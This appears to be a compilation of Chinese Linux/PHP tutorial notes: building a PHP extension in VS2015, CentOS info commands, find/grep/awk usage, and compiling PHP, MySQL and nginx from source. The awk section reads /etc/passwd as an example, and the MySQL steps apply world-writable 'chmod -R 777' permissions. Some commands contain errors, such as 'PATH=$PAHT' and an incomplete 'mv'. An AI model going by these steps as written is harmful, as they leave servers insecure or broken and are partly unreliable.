选择了 “从现有代码创建项目” 后，会出现创建项目的向导，如下图：
直接点击 “下一步”，到如下图：
在此步骤，选择刚才生成的扩展模板的目录，然后填入项目名称，这里是“loaddll”，点击“下一步”，到达如下图：
此步骤选择DLL项目，点击下一步，到达如下图：
直接点击“下一步”，到达如下图：
点击“完成”，等待 VS2015 开始创建项目。
配置编译选项并编译项目
在 VS2015 生成项目完毕后，切换项目为 “Release”和“x64”的选项，如下图：
切换完成后，在项目上右键选择“属性”，如下图：
修改配置类型为 DLL，这样生成的目标文件扩展名自动变为 .dll，如下图所示：
选择“配置属性” -> “C/C++” -> “常规”，在“附加包含目录”中点击“编辑”来添加相关的目录，如下图：
这里需要包含的目录包括如下图的几个目录：
这里主要是添加了 PHP 源码的几个目录，因为编译 PHP 扩展的源码时需要 PHP 的底层内核数据结构进行支持，因此需要包含以上的目录。
选择“配置属性” -> “C/C++” -> “预处理器”，在“预处理器定义”中点击“编辑”来添加相关预处理指令，如下图：
在预处理中，HAVE_LOADDLL 中的 LOADDLL 是扩展的名称，COMPILE_DL_LOADDLL 中的 LOADDLL 同样也是扩展的名称，
这个名称与最开始生成扩展模板时的名称应该一致。

编译源代码
把 php-7.2.20-src\win32\build\ 目录下的 config.w32.h.in 复制到 php-7.2.20-src\main\ 目录下，
并重命名为 config.w32.h，这个 .h 文件在编译时是需要的，但是在 php-7.2.20-src\main\ 下并没有该文件，因此需要自己手动进行复制。
在 config.w32.h 中增加如下代码
1 #define PHP_COMPILER_ID "VC15" 
注意这里的 VC15 ，在下载源代码的时候，我们已经见到过这个标识了。
接着，从 PHP 的安装目录中复制 php7ts.lib 文件到 loaddll 目录下，注意，是从PHP 的安装目录中，而不是 PHP 源代码的目录中。
php7ts.lib 在目录 php7.2.10\dev 目录下，我使用的是 wamp64 下的 php7.2.10，
大家自己使用对应的 .lib 文件即可，当然，这个 .lib 文件也必须是 php7.2 的，因为我们下载的是 php7.2 的源码。
在项目的 resource Files 下添加 php7ts.lib 文件，添加该文件就比较简单了，同样是右键添加即可。
按下 F7 生成解决方案，如图：
看到“成功 1 个”文件以后，在目录 \php-7.2.20-src\ext\loaddll\x64\Release 下会生成一个 loaddll.dll 文件，这个文件就是我们的 PHP 扩展文件。

PHP 扩展的安装与测试
将VS2015 生成 loaddll.dll 重命名为 php_loaddll.dll ，将其拷贝到 PHP 环境的扩展中，
我的路径是 php\php7.2.10\ext，想必熟悉 PHP 的应该都会添加 PHP 扩展。如下图：
在 php.ini 文件中增加配置，如下图：
使用 php -m 来查看是否有 loaddll.dll 模块，如下图：
phpinfo 查看，如下图：
通过上面可以看出，我们的 PHP 扩展已经正常安装了，接下来就需要测试我们的扩展是否可以运行了。
在 PHP 源码目录下 php-7.2.20-src\ext\loaddll\ 有一个 loaddll.php 的测试文件，在命令行下进行执行该命令：
1 php loaddll.php
输出内容如下：
1 λ php loaddll.php
2 Functions available in the test extension:
3 confirm_loaddll_compiled
4 
5 Congratulations! You have successfully modified ext/loaddll/config.m4. Module loaddll is now compiled into PHP.
如下图：
看到如上输出，说明该扩展的模板编译成功，可以继续开发实际的扩展模块了。
总结
很多时候，学习编程的第一步就是搭建环境，而往往搭建环境的过程中由于步骤过于复杂，
而资料又没有傻瓜化的详细步骤，导致很多想要学习或入门的程序员连第一步都无法踏出。
对于开发 PHP 扩展而言也是一样的。
如何通过 PHP 扩展来让 PHP 程序可以直接调用 DLL 中的函数，除了需要掌握 C 语言的知识以外，
还需要掌握 Windows 程序设计的知识，本文就不再讨论了，因为有 C 语言的知识和 Windows 程序设计的知识，
在 PHP 扩展中调用 DLL 并非难事。
```

### 熟练掌握 C/C++
```
```
### 查看 CPU、内存、时间、系统版本等信息
```
CentOS查看系统信息
一：查看CPU
more /proc/cpuinfo | grep "model name"
grep "model name" /proc/cpuinfo
如果觉得需要看的更加舒服
grep "model name" /proc/cpuinfo | cut -f2 -d:
怎么样，linux的命令就要这样熟悉。
二：查看内存
grep MemTotal /proc/meminfo
grep MemTotal /proc/meminfo | cut -f2 -d:
free -m |grep "Mem" | awk '{print $2}'
三：查看cpu是32位还是64位
查看CPU位数(32 or 64)
#getconf LONG_BIT
#echo $HOSTTYPE
#uname -a
四：查看当前linux的版本
#more /etc/RedHat-release
#cat /etc/redhat-release
五：查看内核版本
#uname -r
#uname -a
六：查看当前时间
date
七：查看硬盘和分区
df -h
fdisk -l
也可以查看分区
du -sh
可以看到全部占用的空间
du /etc -sh
可以看到这个目录的大小
八：查看安装的软件包
查看系统安装的时候装的软件包
cat -n /root/install.log
more /root/install.log | wc -l
查看现在已经安装了那些软件包
rpm -qa
rpm -qa | wc -l
yum list installed | wc -l
不过很奇怪，我通过rpm，和yum这两种方式查询的安装软件包，数量并不一样。没有找到原因。
九：查看键盘布局
cat /etc/sysconfig/keyboard
cat /etc/sysconfig/keyboard | grep KEYTABLE | cut -f2 -d=
十：查看selinux情况
sestatus
sestatus | cut -f2 -d:
cat /etc/sysconfig/selinux
十一：查看ip，mac地址
在ifcfg-eth0 文件里你可以看到mac，网关等信息。
ifconfig
cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IPADDR
cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IPADDR | cut -f2 -d=
ifconfig eth0 |grep "inet addr:" |awk '{print $2}'|cut -c 6-
ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'
查看网关
cat /etc/sysconfig/network
查看dns
cat /etc/resolv.conf
十二：查看默认语言
echo $LANG $LANGUAGE
cat /etc/sysconfig/i18n
十三：查看所属时区和是否使用UTC时间
cat /etc/sysconfig/clock
十四：查看主机名
hostname
cat /etc/sysconfig/network
修改主机名就是修改这个文件，同时最好也把host文件也修改
```

### find 、grep 查找文件
```
查找命令：find & grep
区别：
(1) find命令是根据文件的属性进行查找，如文件名，文件大小，所有者，所属组，是否为空，访问时间，修改时间等。 
(2) grep是根据文件的内容进行查找，会对文件的每一行按照给定的模式(patter)进行匹配查找。
一.find命令
基本格式：find  path [options]
1.按照文件名查找
(1)find /etc -name httpd.conf　　#在/etc目录下文件httpd.conf
(2)find /etc -name '*srm*'　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件
(3)find . -name 'srm*' 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件

2.按照文件特征查找 　　　　
(1)find / -amin -10 　　# 查找在系统中最后10分钟访问的文件(access time)
(2)find / -atime -2　　 # 查找在系统中最后48小时访问的文件
(3)find / -empty 　　# 查找在系统中为空的文件或者文件夹
(4)find / -group cat 　　# 查找在系统中属于group为cat的文件
(5)find / -mmin -5 　　# 查找在系统中最后5分钟里修改过的文件(modify time)
(6)find / -mtime -1 　　#查找在系统中最后24小时里修改过的文件
(7)find / -user fred 　　#查找在系统中属于fred这个用户的文件
(8)find / -size +10000c　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)
(9)find / -size -1000k 　　#查找出小于1000KB的文件

3.使用混合查找方式查找文件
参数有： ！，-and(-a)，-or(-o)。
(1)find /tmp -size +10000c -and -mtime +2 　　#在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件
(2)find / -user fred -or -user george 　　#在/目录下查找用户是fred或者george的文件文件
(3)find /tmp ! -user panda　　#在/tmp目录中查找所有不属于panda用户的文件
    　　  

二、grep命令
基本格式：grep [options]
1.主要参数

[options]主要参数：
－c：只输出匹配行的计数。
－i：不区分大小写
－h：查询多文件时不显示文件名。
－l：查询多文件时只输出包含匹配字符的文件名。
－n：显示匹配行及行号。
－s：不显示不存在或无匹配文本的错误信息。
－v：显示不包含匹配文本的所有行。

pattern正则表达式主要参数：
\： 忽略正则表达式中特殊字符的原有含义。
^：匹配正则表达式的开始行。
$: 匹配正则表达式的结束行。
\<：从匹配正则表达 式的行开始。
\>：到匹配正则表达式的行结束。
[ ]：单个字符，如[A]即A符合要求 。
[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。
.：所有的单个字符。
* ：有字符，长度可以为0。

2.实例　 　　　　　
(1)grep 'test' d*　　#显示所有以d开头的文件中包含 test的行
(2)grep ‘test’ aa bb cc 　　 #显示在aa，bb，cc文件中包含test的行
(3)grep ‘[a-z]\{5\}’ aa 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行
(4)grep magic /usr/src　　#显示/usr/src目录下的文件(不含子目录)包含magic的行
(5)grep -r magic /usr/src　　#显示/usr/src目录下的文件(包含子目录)包含magic的行
(6)grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)
(7)grep -n 8080 文件（确定8080字段在文件中的行数）
(8)grep -n -i "ggpush" 文件 （确定ggpush在文件中的行数并且忽略大小写）
(9)grep 'ggpush' *.cnf （匹配当前目录下所有后缀为cnf文件含有过滤字段的内容）

详细使用参见：http://www.cnblogs.com/end/archive/2012/02/21/2360965.html

(1)grep 'test' d*　　#显示所有以d开头的文件中包含 test的行
(2)grep ‘test’ aa bb cc 　　 #显示在aa，bb，cc文件中包含test的行
(3)grep ‘[a-z]\{5\}’ aa 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行
(4)grep magic /usr/src　　#显示/usr/src目录下的文件(不含子目录)包含magic的行
(5)grep -r magic /usr/src　　#显示/usr/src目录下的文件(包含子目录)包含magic的行
(6)grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)
(7)grep -n 8080 文件（确定8080字段在文件中的行数）
(8)grep -n -i "ggpush" 文件（确定ggpush在文件中的行数并且忽略大小写）
(9)grep 'ggpush' *.cnf （匹配当前目录下所有后缀为cnf文件含有过滤字段的内容）
```


 
### awk 处理文本
```
参考资料：
http://man.linuxde.net/awk
http://www.cnblogs.com/chengmo/archive/2013/01/17/2865479.html
http://bbs.chinaunix.net/thread-691456-1-1.html
awk是一种编程语言，用于在linux/unix下对文本和数据进行处理。
数据可以来自标准输入(stdin)、一个或多个文件，或其它命令的输出。
它支持用户自定义函数和动态正则表达式等先进功能，是linux/unix下的一个强大编程工具。
它在命令行中使用，但更多是作为脚本来使用。awk有很多内建的功能，比如数组、函数等，
这是它和C语言的相同之处，灵活性是awk做大的优势。

awk还提供了一系列内置的运算函数（如log、sqr、cos、sin等）和一些用于对字符串进行操作（运算）的函数（如length、substr等等）。
这些函数的引用大大的提高了awk的运算功能。作为对条件转移指令的一部分，关系判断是每种程序设计语言都具备的功能，
awk也不例外，awk中允许进行多种测试，作为样式匹配，还提供了模式匹配表达式~（匹配）和~!（不匹配）。
作为对测试的一种扩充，awk也支持用逻辑运算符。

awk命令格式
awk [options] 'script' var=value file(s) 
awk [options] -f scriptfile var=value file(s)

option有以下选择：
-F fs：fs为分隔符，可以是字符串也可以是正则表达式，这个作用就是制定分隔符
-v：赋值一个用户定义变量，将外部变量传递给awk。VAR=10000 echo | awk -v VARIABLE=$VAR '{ print VARIABLE }'
或者：
var1="aaa" 
var2="bbb" 
echo | awk '{ print v1,v2 }' v1=$var1 v2=$var2
变量之间用空格分隔作为awk的命令行参数跟随在BEGIN、{}和END语句块之后。
script脚本的结构
awk 'BEGIN{ commands } pattern { commands } END{ commands }'
awk脚本通常由：BEGIN语句块、能够使用模式匹配的通用语句块、END语句块3部分组成，
这三个部分是可选的。任意一个部分都可以不出现在脚本中，脚本通常是被单引号或双引号中，
例如： awk 'BEGIN{ i=0 } { i++ } END{ print i }' filename
第一步：执行BEGIN{ commands }语句块中的语句； 
第二步：从文件或标准输入(stdin)读取一行，然后执行pattern{ commands }语句块，它逐行扫描文件，
从第一行到最后一行重复这个过程，直到文件全部被读取完毕。 
第三步：当读至输入流末尾时，执行END{ commands }语句块。
BEGIN语句块在awk开始从输入流中读取行之前被执行，这是一个可选的语句块，
比如变量初始化、打印输出表格的表头等语句通常可以写在BEGIN语句块中。 
END语句块在awk从输入流中读取完所有的行之后即被执行，
比如打印所有行的分析结果这类信息汇总都是在END语句块中完成，它也是一个可选语句块。 
pattern语句块中的通用命令是最重要的部分，它也是可选的。如果没有提供pattern语句块，
则默认执行{ print }，即打印每一个读取到的行，awk读取的每一行都会执行该语句块。
print中双引号里的内容是直接打印的。pattern语句块类似一个循环体，会对文件中的每一行进行迭代。
awk的内置变量
$n 当前记录的第n个字段，比如n为1表示第一个字段，n为2表示第二个字段。 
$0 这个变量包含执行过程中当前行的文本内容。
FILENAME 当前输入文件的名。
FS 字段分隔符（默认是任何空格）。
NF 表示字段数，在执行过程中对应于当前的字段数。
NR 表示记录数，在执行过程中对应于当前的行号。 
OFMT 数字的输出格式（默认值是%.6g）。
OFS 输出字段分隔符（默认值是一个空格）。 
ORS 输出记录分隔符（默认值是一个换行符）。
RS 记录分隔符（默认是一个换行符）。
使用print $NF可以打印出一行中的最后一个字段，使用$(NF-1)则是打印倒数第二个字段，其他以此类推。
统计文件中的行数：awk 'END{ print NR }' filename。这里只使用了END语句块，在读入每一行的时，
awk会将NR更新为对应的行号，当到达最后一行NR的值就是最后一行的行号，所以END语句块中的NR就是文件的行数。
一个每一行中第一个字段值累加：awk 'BEGIN{ sum=0; print "总和：" } { print $1"+"; sum+=$1 } END{ print "等于"; print sum }' 

awk的运算
和普通语言的运算一样，||&&，只有~匹配正则表达式，~！不匹配正则表达式。
awk中next语句使用：在循环逐行匹配，如果遇到next，就会跳过当前行，直接忽略下面语句。
而进行下一行匹配。next语句一般用于多行合并。当记录行号除以2余1，就跳过当前行。
下面的print NR,$0也不会执行。下一行开始，程序有开始判断NR%2值。
这个时候记录行号是：2 ，就会执行下面语句块：'print NR,$0'
打印偶数行：awk 'NR%2==1{next}{print NR,$0;}' awktext.txt
awktext.txt中的内容如下：
将包含有aa的行跳过：awk '/^aa/{next;}{print "\t"$0;}' awktest.txt
结果：
awk中允许用如下方式将结果输出到一个文件：
echo | awk '{printf("hello word!n") > "datafile"}' 或 echo | awk '{printf("hello word!n") >> "datafile"}'
在linux awk的while、do-while和for语句中允许使用break,continue语句来控制流程走向，也允许使用exit这样的语句来退出。break中断当前正在执行的循环并跳到循环外执行下一条语句。if 是流程选择用法。awk中，流程控制语句，语法结构，与c语言类型。每条命令语句后面可以用;分号结尾。
awk 'BEGIN{ 
test=100; 
total=0; 
while(i<=test){ 
total+=i; 
i++; 
} 
print total; 
}'

awk数组
数组是awk的灵魂，处理文本中最不能少的就是它的数组处理。
因为数组索引（下标）可以是数字和字符串在awk中数组叫做关联数组(associative arrays)。
awk 中的数组不必提前声明，也不必声明大小。数组元素用0或空字符串来初始化，这根据上下文而定。
字符串和数字都可以做数组下标。
{ for(item in array) {print array[item]}; } #输出的顺序是随机的 
{ for(i=1;i<=len;i++) {print array[i]}; } #Len是数组的长度
得到数组长度：awk 'BEGIN{info="it is a test";lens=split(info,tA," ");print length(tA),lens;}'
删除数组：delete array[key]可以删除，对应数组key的，序列值。
awk中有一些字符串的处理函数，使用的话可以查询。
打开外部文件（close用法）：
awk 'BEGIN{while("cat /etc/passwd"|getline){print $0;};close("/etc/passwd");}'
逐行读取外部文件(getline使用方法）：
awk 'BEGIN{while(getline < "/etc/passwd"){print $0;};close("/etc/passwd");}'
awk 'BEGIN{print "Enter your name:";getline name;print name;}'
调用外部应用程序(system使用方法）：
awk 'BEGIN{b=system("ls -al");print b;}'
awk应用例子
单双引号的差别是:shell对单引号中的内容不解释,直接传给awk,而对双引号中的内容解释后再传给awk.
1、 awk '/101/'   file             显示文件file中包含101的匹配行。
awk '/101/,/105/'  file       显示文件file中包含101到105的匹配行。
awk '$1 == 5'   file            显示文件file中第一字段值为5的行。
awk '$1 == "CT"'  file        显示文件file中第一字段值为CT的行。注意必须带双引号
awk '$1 * $2 >100 '   file    显示文件file中第一字段值和第二字段值乘积大于100的行。
awk '$2 >5 && $2<=15'   file    显示文件file中第2字段值大于5同时小于15的行。
2、 awk '{print NR,NF,$1,$NF,}' file   显示文件file的当前记录号、域数和每一行的第一个和最后一个域。
awk '/aa/ {print $1,$2 + 10}' file    显示文件file的匹配行的第一、二个域加10。
awk '/aa/ {print $1$2}'  file           找出匹配的行，在输出 等同于下面语句
awk '/aa/ {print $1 $2}' file     显示文件file的匹配行的第一、二个域，但显示时域中间没有分隔符。
3、 df | awk '$4>1000000 '         通过管道符获得输入，如：显示第4个域满足条件的行。
4、 awk -F “|” '{print $1}'   file      按照新的分隔符“|”进行操作。
awk  'BEGIN { FS="[: \t|]" }
{print $1,$2,$3}'    file               通过设置输入隔符（FS="[: \t|]"）修改输入分隔符。
Sep="|"
awk -F $Sep '{print $1}'  file          按照环境变量Sep的值做为分隔符。   
awk -F '[ :\t|]' '{print $1}' file          按照正则表达式的值做为分隔符，这里代表空格、:、TAB、|同时做为分隔符。
awk -F '[][]'    '{print $1}' file          按照正则表达式的值做为分隔符，这里代表[、]
5、awk -f awkfile              file 通过文件awkfile的内容依次进行控制。
cat awkfile
/101/{print "\047 Hello! \047"} --遇到匹配行以后打印 ' Hello! '.\047代表单引号。
{print $1,$2}                               --因为没有模式控制，打印每一行的前两个域。
6、awk '$1 ~ /101/ {print $1}' file             显示文件中第一个域匹配101的行（记录）。
7、awk   'BEGIN { OFS="%"} {print $1,$2}'    file         通过设置输出分隔符（OFS="%"）修改输出格式。
8、取得文件第一个域的最大值
awk   'BEGIN { max=100 ;print "max=" max}             BEGIN 表示在处理任意行之前进行的操作。
{max=($1 >max ?$1:max); print $1,"Now max is "max}' file 
9、  awk '/tom/ {wage=$2+$3; printf wage}' file             找到匹配行后为变量wage赋值并打印该变量。
10、awk '/tom/ {count++;} 
END {print "tom was found "count" times"}' file             END表示在所有输入行处理完后进行处理。
11、在awk中调用系统变量必须用单引号，如果是双引号，则表示字符串
Flag=abcd
awk '{print '$Flag'}'   结果为abcd
awk '{print  "$Flag"}'   结果为$Flag
12、比如以下这个例子：
a.sh脚本内容
CPU_MIN=90
cat aa|awk "{print $CPU_MIN,$1}"
执行时带个参数：a.sh  1234
如果按你的说法应该显示： 90  1234
但实际上只显示90，为什么$1的值没有取到，是否应该和awk本身的变量定义有冲突。如果不使用中间变量，这个1234如何传递到awk中？
$1是awk的特殊变量，不应该被shell解释。可以这样：
cat aa|awk "{print $CPU_MIN,\$1}"
```

### 自己编译过 PHP 吗？如何打开 readline 功能
```
手动编译PHP开发环境

问题复盘
你有没有遇到过这样的情况，部署了集成环境，每次添加扩展的时候，总是需要找一堆的配置文件的位置（其实很多人都能熟练使用集成环境）
你有没有遇到过这样的情况，去面试，面试官问你:有没有自己手动编译过环境? 你却回答 我一般都使用集成环境
你有没有遇到过这样的问题，本来自己的服务器配置就很low（有的甚至使用的是vps）
基本上使用lnmp或者bt或者其他等等集成环境 但是他们的优缺点十分明显
这可能就是我现在需要手动编译环境的理由吧
部署环境及配置
linux centos 7.3
阿里云香港轻量级应用服务器 34/月
购买推荐链接:https://promotion.aliyun.com/ntms/yunparter/invite.html?userCode=4jm8fecv
目标环境
php 7.2
mysql 5.7.2
nginx 1.1.8
安装部署环境开始
考虑到纯净安装. 所以首先我们需要一台干净的服务器（为了这个 我把博客的全部东西干掉了直接导致服务器停运24小时）
首先我们确定安装目录
我是在根目录部署了www目录直接使用命令
mkdir -p /www/{lnmp,web,source} `
这里创建的 www
/lnmp存放安装软件
/web 存放程序代码
/source 存放安装软件
首先安装PHP
PHP下载网址:
http://am1.php.net/distributions/php-7.2.1.tar.gz
所有的操作全部在 我们自己建立的www/lnmp 下

一、更换yum源
这对我们很重要，因为centos 内部的源一般都是国外的站点，我使用的是阿里云的服务器 所以这里我也是用阿里云的yum源
yum源的地址在
/etc/yum.repos.d/
将下面的默认Centos-Base.repo 进行备份
mv /etc/yum.repos.d/Centos-Base.repo.bak
进入阿里云的镜像地址:http://mirrors.aliyun.com/
在阿里云的镜像地址找到自己对应的版本然后使用wget 进行下载
没有wget的，提前使用yum 安装一个
然后依次执行以下命令
yum clean all
yum makecache
yum update
然后在裸机上面安装必要的扩展
yum -y install wget vim pcre pcre-devel openssl openssl-devel libicu-devel gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel ncurses ncurses-devel curl curl-devel krb5-devel libidn libidn-devel openldap openldap-devel nss_ldap jemalloc-devel cmake boost-devel bison automake libevent libevent-devel gd gd-devel libtool* libmcrypt libmcrypt-devel mcrypt mhash libxslt libxslt-devel readline readline-devel gmp gmp-devel libcurl libcurl-devel openjpeg-devel
上面安装的都是必要的一些扩展
我们还可以使用yum 对系统的内核进行更新
yum install epel-release -y // 此步骤可以省略

安装PHP
首先切换到我们的www/lnmp目录下
然后使用tar -zxvf php-7.2.1.tar.gz 进行解压
解压完毕之后 我们进入 解压过的目录
设置变量并开始源码编译：
cp -frp /usr/lib64/libldap* /usr/lib/
这里我们使用的是自定义的目录所以编译配置也需要改变
./configure --prefix=/www/source/php \
--with-config-file-path=/www/source/php/etc \
--enable-fpm \
--with-fpm-user=www \
--with-fpm-group=www \
--enable-mysqlnd \
--with-mysqli=mysqlnd \
--with-pdo-mysql=mysqlnd \
--enable-mysqlnd-compression-support \
--with-iconv-dir \
--with-freetype-dir \
--with-jpeg-dir \
--with-png-dir \
--with-zlib \
--with-openssl \
--with-libxml-dir \
--enable-xml \
--disable-rpath \
--enable-bcmath \
--enable-shmop \
--enable-sysvsem \
--enable-inline-optimization \
--with-curl \
--enable-mbregex \
--enable-mbstring \
--enable-intl \
--with-libmbfl \
--enable-ftp \
--with-gd \
--enable-gd-jis-conv \
--with-openssl \
--with-mhash \
--enable-pcntl \
--enable-sockets \
--with-xmlrpc \
--enable-zip \
--enable-soap \
--with-gettext \
--disable-fileinfo \
--enable-opcache \
--with-pear \
--enable-maintainer-zts \
--with-ldap=shared \
--without-gdbm
此处重点要考
php7.2 去掉了很多原先php5 - php7.0的扩展 如之前的加密扩展
mcrypt 还有很多 这里我就不一一举例了
编译完毕之后，我们进行下一步
make -j 4 && make install
接下来需要等待大约10-20分钟 这个根据我们的服务器而定 如果觉得慢我们可以使用
make -j 8 && make install
上面两条命令都可以使用
接下来配置php.ini 文件:
cp php.ini-development /www/source/php/ect/php.ini
cp /www/source/php/etc/php-fpm.conf.default /www/source/php/etc/php-fpm.conf
cp /www/source/php/etc/php-fpm.d/www.conf.default /www/source/php/etc/php-fpm.d/www.conf
上述是我的配置文件地址，如果你出现错误 或者找不到文件位置，请按照你自己配置的文件安装目录进行查询
也可以使用 find 查询
配置php.ini
我直接贴出我修改的一些配置 仅供参考 可以根据个人情况进行调整
expose_php = Off
short_open_tag = ON
max_execution_time = 30
date.timezone = Asia/Shanghai
extension= /www/source/php/lib/php/extensions/no-debug-zts-20170718/ldap.so
zend_extension = /www/source/php/lib/php/extensions/no-debug-zts-20170718/opcache.so
opcache.memory_consumption=128
opcache.interned_strings_buffer=8
opcache.max_accelerated_files=4000
opcache.revalidate_freq=60
opcache.fast_shutdown=1
opcache.enable_cli=1
disable_functions = passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru
配置www.conf (此处为配置php-fpm 可略)
到了这一步的时候 我们需要建立对应的用户www
groupadd www
useradd -g www www
然后创建存放 php-cgi.sock 的目录
mkdir /var/run/www/
chown -R www:www /var/run/www
然后配置www.conf文件
vim /www/source/php/etc/php-fpm.d/www.conf
配置详解
slowlog = var/log/slow.log
listen = /var/run/www/php-cgi.sock
其他的都不需要改变
然后配置php-fpm.conf
pid = /usr/local/php/var/run/php-fpm.pid
至此php7已经安装完成。说明：禁用php函数，如果程序需要这些函数，可以取消禁止，新手建议忽略此步骤。
创建system系统单元文件php-fpm启动脚本：
vim /usr/lib/systemd/system/php-fpm.service
直接 编写
[Unit]
Description=The PHP FastCGI Process Manager
After=syslog.target network.target

[Service]
Type=simple
PIDFile=/usr/local/php/var/run/php-fpm.pid
ExecStart=/www/source/php/bin/php-fpm --nodaemonize --fpm-config /www/source/php/etc/php-fpm.conf
ExecReload=/bin/kill -USR2 $MAINPID

[Install]
WantedBy=multi-user.target
将php-fpm服务启动并加入开机自启动

systemctl enable php-fpm.service
systemctl restart php-fpm.service
配置全局变量
接下来我们就已经配置完毕了试一试php-v
是不是突然报错 ， 没有php 不要慌
这是因为我们没有把PHP 加入全局变量的原因
vim /etc/profile
// 最后一行加入
PATH=$PAHT:/www/source/php/bin
// 保存退出
 source /etc/profile
再次执行 php -v
我们会显示

PHP 7.2.1 (cli) (built: Jul 26 2019 10:50:53) ( ZTS )
Copyright (c) 1997-2017 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2017 Zend Technologies
with Zend OPcache v7.2.1, Copyright (c) 1999-2017, by Zend Technologies
安装mysql
实现我们需要安装mysql 安装的一些依赖 这个大多都是使用yum安装 可以直接百度
// 我这边直接使用
yum install -y gcc gcc-c++ make sudo autoconf libtool-ltdl-devel gd-devel \
        freetype-devel libxml2-devel libjpeg-devel libpng-devel \
        openssl-devel curl-devel patch libmcrypt-devel \
        libmhash-devel ncurses-devel bzip2 \
        libcap-devel ntp sysklogd diffutils sendmail iptables unzip cmake
接下来创建mysql的用户组和用户

groupadd mysql
useradd -r mysql -g mysql
下载必要的包
安装mysql5.6的时候就已经使用cmake了 我们这里使用mysql 5.7
还需要安装一个boost的包
wget https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.20.tar.gz
wget --no-check-certificate http://sourceforge.net/projects/boost/files/boost/1.59.0/boost_1_59_0.tar.gz

然后解压mysql 5.7
进入mysql5.7目录
然后将 我们下载的 boots 包 移动到 解压完毕的mysql文件夹内部
然后我们新建一个 configure 文件夹 接下来我们将在该文件夹内 完成整套编译工作
然后贴出我的配置
cmake .. -DBUILD_CONFIG=mysql_release \
-DINSTALL_LAYOUT=STANDALONE \
-DCMAKE_BUILD_TYPE=RelWithDebInfo \
-DENABLE_DTRACE=OFF \
-DWITH_EMBEDDED_SERVER=OFF \
-DWITH_INNODB_MEMCACHED=ON \
-DWITH_SSL=bundled \
-DWITH_ZLIB=system \
-DCMAKE_INSTALL_PREFIX=/www/source/mysql/ \
-DINSTALL_PLUGINDIR="/www/source/mysql/lib/plugin" \
-DDEFAULT_CHARSET=utf8 \
-DDEFAULT_COLLATION=utf8_general_ci \
-DWITH_EDITLINE=bundled \
-DFEATURE_SET=community \
-DCOMPILATION_COMMENT="MySQL Server (GPL)" \
-DWITH_DEBUG=OFF \
-DWITH_BOOST=..
关于这些配置命令的名称 网络上都有介绍 我就不过多的讲述了
如果出现编译失败 那么 一定要删除当前目录下的
rm -rf CMakeCache.txt 文件
当我们编译完成之后 执行
make && make install
接下来就是耐心等待20分钟左右
初始化数据库
新建数据库文件夹以及日志文件夹，并更改用户为mysql:
mkdir /www/source/mysql/mysql_data
mkdir /www/source/mysql/log
chown -R mysql:mysql /www/source/mysql/mysql_data
chown -R mysql:mysql /www/source/mysql/log
// 在日志文件中建立 error.log 文件
// 赋权限整个目录及其文件夹
chmod -R 777 /www/source/mysql/log
修改配置文件
# vim /etc/my.cnf
[mysqld]
port=3306
datadir=/www/source/mysql/mysql_data
log_error=/www/source/mysql/log/error.log
basedir=/www/source/mysql/
// 注意：my.cnf文件有以下配置
socket=/www/source/mysql/mysql_data/mysql.sock
// 需要手动建立mysql.sock,并赋值读写执行权限
chmod -R 777 mysql.sock
初始化数据库
/var/mysql/bin/mysqld  --initialize --user=mysql
去查看刚刚创建的文件夹内 是否存在生成的文件
配置启动文件及环境变更
配置启动文件
cp /var/mysql/support-files/mysql.server /etc/init.d/mysqld
修改启动文件
vim /etc/init.d/mysqld
# 找到如下二行：
basedir=
datadir=
# 修改为：
basedir=/www/source/mysql/
datadir=/www/source/mysql/mysql_data/
启动mysql
/etc/init.d/mysqld start
可以看到提示，已经成功启动。当然你也可以使用systemctl来启动MySQL，但执行后，不会有任何提示。
systemctl start mysqld
然后我们将mysql 加入全局变量
这次我试了很多方式 但是没有成功 所以 我直接建立了一个软链
当我们执行某命令的时候 服务器首先去看/user/bin这个文件夹
ln -s /www/source/mysql/bin /usr/bin
修改mysql 密码
从mysql5.7开始 mysql不在支持空密码登录 所以我们直接查看密码
cat /www/source/mysql/log/error.log |grep 'A temporary password'
2019-07-13T06:28:23.096812Z 1 [Note] A temporary password is generated for root@localhost: wa&sk371_,US
后面的就是我们的mysql 密码了
然后我们直接使用mysql登录进去
mysql> alter user 'root'@'localhost' identified by 'your_password';
ok！！！！

安装nginx
准备工作
安装nginx 的时候 我们首先还需要安装3个依赖包
pcre：在使用 nginx 的 rewrite 模块的时候，需要有pcre库的支持
openssl：在使用ssl功能时，需要有 openssl库的支持
zlib：在使用gzip模块时，需要有zlib库的支持。
而这三个模块都是我们常用的，所以这3个依赖包还是要安装的。
1、安装pcre
首先下载这个包
wget https://jaist.dl.sourceforge.net/project/pcre/pcre/8.36/pcre-8.36.tar.gz
tar -zxvf pcre-8.36.tar.gz
cd pcre-8.36
./configure
make && make install
2、安装 openssl
wget https://www.openssl.org/source/openssl-1.1.0k.tar.gz
tar -zxvf openssl-1.1.0k.tar.gz
cd openssl-1.1.0k
./config
make && make install
3、安装zlib
wget https://zlib.net/zlib-1.2.11.tar.gz
tar -zxvf zlib-1.2.11.tar.gz
cd zlib-1.2.11
CFLAGS="-O3 -fPIC" ./configure
make && make install
编译nginx
因为nginx的命令有很多 我们可以使用
./configure --help
这里我推荐使用
./configure --user=www --group=www --prefix=/www/source/nginx --with-pcre=/www/lnmp/pcre-8.36 --with-zlib=/www/lnmp/zlib-1.2.11 --with-openssl=/www/lnmp/openssl-1.1.0k
上面的命令是和我们下载的pcre以及openssl and zlib要关联上的 具体看你的配置
